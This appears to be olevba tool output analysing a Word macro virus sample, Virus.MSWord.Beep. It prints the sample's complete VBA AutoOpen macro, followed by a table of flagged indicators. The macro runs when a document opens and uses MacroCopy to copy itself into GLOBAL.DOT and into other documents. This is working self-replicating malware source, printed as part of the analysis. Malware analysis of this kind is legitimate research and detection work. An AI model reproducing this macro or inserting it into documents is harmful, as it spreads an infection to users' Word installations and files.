olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Beep-8ddfb28c1b901900c12b02215f3c14498d84bcfa
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Beep-8ddfb28c1b901900c12b02215f3c14498d84bcfa - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Beep-8ddfb28c1b901900c12b02215f3c14498d84bcfa - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim A$
Dim Z$
    On Error Resume Next
    A$ = "Global:AutoOpen"
    Z$ = WordBasic.[FileName$]() + ":AutoOpen"
    If A$ = Z$ Then
        WordBasic.Beep
    Else: WordBasic.MacroCopy A$, Z$, 1 ' infect a file from the GLOBAL.DOT
    If A$ = Z$ Then
        WordBasic.Beep
    Else: WordBasic.MacroCopy Z$, A$, 1 ' infect the GLOBAL.DOT from the file
    If A$ = Z$ Then
        WordBasic.Beep
    Else: WordBasic.FileSaveAs Format:=1
End If
End If
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

